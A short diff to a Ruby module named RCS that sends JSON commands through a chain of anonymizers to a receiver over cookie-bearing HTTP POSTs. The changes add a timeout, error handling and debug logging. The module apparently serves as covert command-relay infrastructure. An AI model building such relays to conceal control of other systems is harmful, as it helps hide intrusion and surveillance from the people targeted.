@@ -40,6 +40,8 @@ module RCS
         command = JSON.parse(@http_content)
         trace :debug, "Received command: #{command.inspect}"
 
+        #TODO: check if it's a legacy push
+
         return protocol_send_command(command)
       rescue Exception => e
         trace :error, "Cannot push to anonymizer: #{e.message}"
@@ -212,10 +214,21 @@ module RCS
         end until chain.empty?
 
         trace :info, "Sending complete command to: #{receiver['name']}"
+        trace :debug, "Sending complete command to: #{receiver['address']}:#{receiver['port']}"
+
+        resp = nil
 
         # send the command
-        http = Net::HTTP.new(receiver['address'], receiver['port'])
-        resp = http.send_request('POST', '/', msg, {'Cookie' => receiver['cookie']})
+        begin
+          Timeout::timeout(30) do
+            http = Net::HTTP.new(receiver['address'], receiver['port'])
+            resp = http.send_request('POST', '/', msg, {'Cookie' => receiver['cookie']})
+          end
+        rescue Exception => ex
+          trace :error, "Cannot communicate wiht #{receiver['name']}: #{ex.message}"
+          return STATUS_SERVER_ERROR, ex.message
+        end
+
         # receive, check and decrypt a command
         reply = protocol_decrypt(resp['cookie'], resp.body)
 
